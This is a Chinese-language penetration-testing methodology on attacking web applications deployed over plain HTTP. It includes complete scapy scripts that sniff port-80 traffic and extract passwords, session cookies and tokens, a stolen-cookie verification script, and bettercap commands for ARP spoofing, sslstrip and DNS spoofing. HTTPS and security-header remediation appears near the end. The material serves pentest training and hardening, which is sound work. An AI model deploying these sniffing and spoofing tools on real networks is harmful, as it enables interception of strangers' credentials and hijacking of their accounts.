# HTTP-only 部署攻击

## 1. 方法论概述

### 1.1 编写目的
本方法论指导渗透测试人员识别和利用仅使用 HTTP（无 HTTPS/TLS）部署的 Web 应用的安全问题，包括会话劫持、凭证拦截和中间人攻击。

### 1.2 适用范围
- 仅监听 HTTP 端口（80）的应用
- 无 HTTPS 重定向配置
- 缺少 HSTS 响应头
- Cookie 缺少 Secure 标志

### 1.3 读者对象
- 渗透测试工程师
- 网络安全的测试人员
- 红队成员

---

## 2. 技术原理

### 2.1 HTTP-only 部署风险

**风险链：**
```
仅 HTTP 部署
    ↓
无 TLS 加密
    ↓
所有流量明文传输
    ↓
网络攻击者可嗅探
    ↓
会话 Cookie/凭证泄露
```

### 2.2 典型配置问题

**Flask 配置：**
```python
# ❌ 不安全配置
app.run(host='0.0.0.0', port=80)  # 仅 HTTP

# 缺少安全配置
# SESSION_COOKIE_SECURE = False  # 允许 HTTP 传输 Cookie
# 无 HSTS 头
# 无 HTTPS 重定向
```

**响应头缺失：**
```
# ❌ 不安全的响应头
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.20
Set-Cookie: session=abc123; HttpOnly; Path=/
# Missing: Strict-Transport-Security
# Missing: Secure flag on cookie
```

### 2.3 攻击面

**可拦截的数据：**
- 会话 Cookie
- 认证凭证（用户名/密码）
- CSRF Token
- 敏感 API 请求/响应
- 用户输入数据

---

## 3. 攻击场景

### 3.1 场景 1：会话 Cookie 劫持

**目标：** 窃取受害者会话 Cookie

**前置条件：**
- 攻击者与受害者在同一网络（WiFi、LAN）
- 应用仅使用 HTTP
- Cookie 无 Secure 标志

**攻击步骤：**

1. **网络嗅探设置**
   ```bash
   # 使用 tcpdump 捕获流量
   tcpdump -i wlan0 -s 0 -w capture.pcap port 80
   
   # 或使用 Wireshark
   wireshark -i wlan0
   ```

2. **提取会话 Cookie**
   ```bash
   # 从捕获文件中提取 Cookie
   tshark -r capture.pcap -Y "http.cookie" \
     -T fields -e http.cookie
   ```

3. **使用窃取的 Cookie**
   ```bash
   curl -H "Cookie: session=STOLEN_VALUE" \
     http://target/admin
   ```

### 3.2 场景 2：中间人攻击

**目标：** 拦截并修改 HTTP 流量

**工具：** BetterCAP、Ettercap

**BetterCAP 攻击步骤：**

1. **启动 BetterCAP**
   ```bash
   bettercap -iface wlan0
   ```

2. **启用 HTTP 嗅探**
   ```
   bettercap> net.show
   bettercap> set http.proxy.sslstrip true
   bettercap> http.proxy on
   ```

3. **执行 ARP 欺骗**
   ```
   bettercap> arp.spoof on
   ```

4. **监控流量**
   ```
   bettercap> events.stream
   ```

### 3.3 场景 3：凭证拦截

**目标：** 窃取登录凭证

**攻击流程：**
```
受害者 → POST /login (HTTP)
       ↓
攻击者嗅探
       ↓
提取 username/password
       ↓
使用凭证登录
```

**自动化脚本：**
```python
#!/usr/bin/env python3
"""
HTTP Credential Interceptor
拦截 HTTP 登录凭证
"""

from scapy.all import *
import re

def packet_callback(packet):
    """处理捕获的数据包"""
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # 查找登录凭证
        if 'POST' in payload and ('password' in payload.lower() or 
                                   'passwd' in payload.lower()):
            print("[+] Login Request Detected!")
            print(f"[*] Raw payload:\n{payload}")
            
            # 提取凭证
            username_match = re.search(r'username=([^&]+)', payload)
            password_match = re.search(r'password=([^&]+)', payload)
            
            if username_match and password_match:
                print(f"[+] Username: {username_match.group(1)}")
                print(f"[+] Password: {password_match.group(1)}")

def main():
    print("[*] Starting HTTP credential interceptor...")
    print("[*] Waiting for login requests...")
    
    # 捕获 HTTP 流量（端口 80）
    sniff(filter="tcp port 80", prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
```

---

## 4. 探测与验证

### 4.1 黑盒测试

**步骤 1：检测 HTTP-only 部署**
```bash
# 检查端口监听
nmap -sV -p 80,443 target

# 预期结果（不安全）：
# 80/tcp   open  http
# 443/tcp  closed https
```

**步骤 2：检查 HTTPS 重定向**
```bash
# 测试 HTTP 到 HTTPS 重定向
curl -I http://target/

# 不安全响应（无重定向）：
# HTTP/1.1 200 OK
# Server: Werkzeug/3.0.6

# 安全响应（应重定向）：
# HTTP/1.1 301 Moved Permanently
# Location: https://target/
```

**步骤 3：检查 HSTS 头**
```bash
curl -I https://target/ 2>/dev/null | grep -i strict

# 安全配置应有：
# Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**步骤 4：检查 Cookie 标志**
```bash
# 检查 Set-Cookie 头
curl -I http://target/ | grep -i set-cookie

# 不安全 Cookie：
# Set-Cookie: session=abc; HttpOnly; Path=/
# Missing: Secure

# 安全 Cookie：
# Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax
```

### 4.2 白盒测试

**代码审计检查点：**

```python
# 查找 HTTP-only 配置
grep -rn "app.run" .
grep -rn "port.*80" .
grep -rn "SESSION_COOKIE_SECURE" .

# 危险模式
app.run(host='0.0.0.0', port=80)  # ❌ 仅 HTTP

# 安全模式
app.config['SESSION_COOKIE_SECURE'] = True  # ✅
```

**配置检查：**
```python
# ❌ 不安全配置
app.run(debug=False, host='0.0.0.0', port=80)

# ✅ 安全配置
app.config.update(
    SESSION_COOKIE_SECURE=True,      # 仅 HTTPS 传输
    SESSION_COOKIE_HTTPONLY=True,    # 防止 XSS 窃取
    SESSION_COOKIE_SAMESITE='Lax',   # 防止 CSRF
)
```

---

## 5. 利用方法

### 5.1 网络嗅探脚本

**完整利用工具：**
```python
#!/usr/bin/env python3
"""
HTTP Traffic Interceptor
HTTP 流量拦截工具
"""

from scapy.all import *
import re
from urllib.parse import unquote

class HTTPInterceptor:
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.sessions = {}
        
    def analyze_packet(self, packet):
        """分析数据包"""
        if packet.haslayer(Raw):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # 分析 HTTP 请求
                if 'HTTP/' in payload and 'GET' in payload or 'POST' in payload:
                    self.analyze_http_request(payload, packet)
                    
                # 分析 HTTP 响应
                if 'HTTP/' in payload and 'Set-Cookie' in payload:
                    self.analyze_http_response(payload, packet)
                    
            except Exception as e:
                pass
    
    def analyze_http_request(self, payload, packet):
        """分析 HTTP 请求"""
        # 提取 Cookie
        cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', payload)
        if cookie_match:
            src_ip = packet[IP].src
            cookie = cookie_match.group(1)
            
            if src_ip not in self.sessions or \
               self.sessions[src_ip] != cookie:
                print(f"\n[+] New Session from {src_ip}")
                print(f"    Cookie: {cookie}")
                self.sessions[src_ip] = cookie
        
        # 提取 POST 数据
        if 'POST' in payload:
            # 查找请求体
            parts = payload.split('\r\n\r\n', 1)
            if len(parts) > 1:
                body = unquote(parts[1])
                
                # 查找敏感字段
                sensitive_fields = ['password', 'passwd', 'pwd', 
                                   'token', 'secret', 'key', 'flag']
                
                for field in sensitive_fields:
                    if field in body.lower():
                        print(f"\n[+] Sensitive Data Detected!")
                        print(f"    Field: {field}")
                        print(f"    Body: {body[:200]}")
    
    def analyze_http_response(self, payload, packet):
        """分析 HTTP 响应"""
        # 提取 Set-Cookie
        cookie_matches = re.findall(r'Set-Cookie:\s*([^\r\n]+)', payload)
        for cookie in cookie_matches:
            print(f"\n[+] Set-Cookie Detected!")
            print(f"    Cookie: {cookie}")
            
            # 检查安全标志
            if 'Secure' not in cookie:
                print(f"    ⚠️  WARNING: Missing Secure flag!")
            if 'HttpOnly' not in cookie:
                print(f"    ⚠️  WARNING: Missing HttpOnly flag!")
            if 'SameSite' not in cookie:
                print(f"    ⚠️  WARNING: Missing SameSite flag!")
    
    def start(self):
        """开始拦截"""
        print(f"[*] Starting HTTP interceptor on {self.interface}...")
        print("[*] Capturing traffic on port 80...")
        print("[*] Press Ctrl+C to stop")
        
        try:
            sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=self.analyze_packet,
                store=0
            )
        except KeyboardInterrupt:
            print("\n[*] Stopped")
            print(f"[*] Total sessions captured: {len(self.sessions)}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='HTTP Traffic Interceptor')
    parser.add_argument('-i', '--interface', default='wlan0',
                        help='Network interface')
    
    args = parser.parse_args()
    
    interceptor = HTTPInterceptor(args.interface)
    interceptor.start()

if __name__ == '__main__':
    main()
```

**使用示例：**
```bash
# 在 WiFi 接口上拦截
python3 http_interceptor.py -i wlan0

# 在以太网接口上拦截
python3 http_interceptor.py -i eth0
```

### 5.2 会话劫持验证

**验证脚本：**
```python
#!/usr/bin/env python3
"""
Session Hijacking Verification
验证窃取的会话 Cookie 是否有效
"""

import requests

def verify_session(target, cookie):
    """验证会话 Cookie"""
    session = requests.Session()
    session.cookies.set('session', cookie)
    
    response = session.get(f"{target}/")
    
    if response.status_code == 200:
        print(f"[+] Session Valid!")
        print(f"    Response length: {len(response.text)}")
        
        # 检查是否是管理员会话
        if 'admin' in response.text.lower():
            print(f"[+] Admin Session Detected!")
        
        return True
    return False

def main():
    import argparse
    
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Target URL')
    parser.add_argument('cookie', help='Session cookie value')
    
    args = parser.parse_args()
    
    if verify_session(args.target, args.cookie):
        print(f"\n[*] Use with curl:")
        print(f'    curl -H "Cookie: session={args.cookie}" {args.target}/')
    else:
        print("[-] Session Invalid")

if __name__ == '__main__':
    main()
```

---

## 6. 绕过技巧

### 6.1 绕过网络隔离

**VLAN 跳跃攻击：**
```bash
# 使用 Yersinia 进行 VLAN 攻击
yersinia -G
# 选择 VLAN hopping 攻击
```

### 6.2 ARP 欺骗增强

**使用 BetterCAP 进行 ARP 欺骗：**
```bash
bettercap -iface wlan0

# 在 bettercap 交互界面
bettercap> set arp.spoof.targets 192.168.1.100
bettercap> arp.spoof on
bettercap> net.sniff on
```

### 6.3 DNS 欺骗

**配合 HTTP 拦截：**
```bash
bettercap> set dns.spoof.domains login.target.com
bettercap> set dns.spoof.address 192.168.1.100
bettercap> dns.spoof on
```

---

## 7. 影响评估

### 7.1 直接危害
- 会话 Cookie 窃取
- 认证凭证拦截
- 敏感数据泄露

### 7.2 潜在危害
- 账户完全接管
- 横向移动到其他系统
- 敏感业务数据泄露

### 7.3 CVSS 评分参考
- **基础分数：** 7.5 (High)
- **攻击向量：** Adjacent (AV:A) - 需要网络位置
- **攻击复杂度：** Low (AC:L)
- **权限要求：** None (PR:N)
- **用户交互：** None (UI:N)
- **机密性影响：** High (C:H)
- **完整性影响：** Low (I:L)
- **可用性影响：** None (A:N)

---

## 8. 修复建议

### 8.1 强制 HTTPS

**Nginx 配置：**
```nginx
server {
    listen 80;
    server_name example.com;
    
    # 重定向所有 HTTP 到 HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

### 8.2 Flask 安全配置

```python
# 安全配置
app.config.update(
    SESSION_COOKIE_SECURE=True,      # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # 防止 XSS
    SESSION_COOKIE_SAMESITE='Lax',   # 防止 CSRF
)

# 强制 HTTPS（在代理后）
@app.before_request
def force_https():
    if not request.is_secure:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)
```

### 8.3 安全响应头

```python
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'"
    return response
```

---

## 9. 参考资源

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
- [BetterCAP Documentation](https://www.bettercap.org/)

---

## 10. 实战案例

### 10.1 CTF 挑战案例

**目标：** Flask Markdown 转换器（端口 42369）

**发现：**
```bash
curl -I http://localhost:42369/

# 响应：
# Server: Werkzeug/3.0.6 Python/3.8.20
# Set-Cookie: session=abc; HttpOnly; Path=/
# Missing: Secure, HSTS
```

**利用：**
```bash
# 网络嗅探
python3 http_interceptor.py -i wlan0

# 捕获会话 Cookie
# 使用窃取的 Cookie 访问
curl -H "Cookie: session=STOLEN_VALUE" http://localhost:42369/admin
```

### 10.2 生产环境案例

**场景：** 内部 Flask 应用

**问题：**
- 仅 HTTP 部署（端口 80）
- 无 HSTS 头
- Cookie 无 Secure 标志
- 运行在共享 WiFi 网络

**影响：** 攻击者可在同一网络拦截所有会话
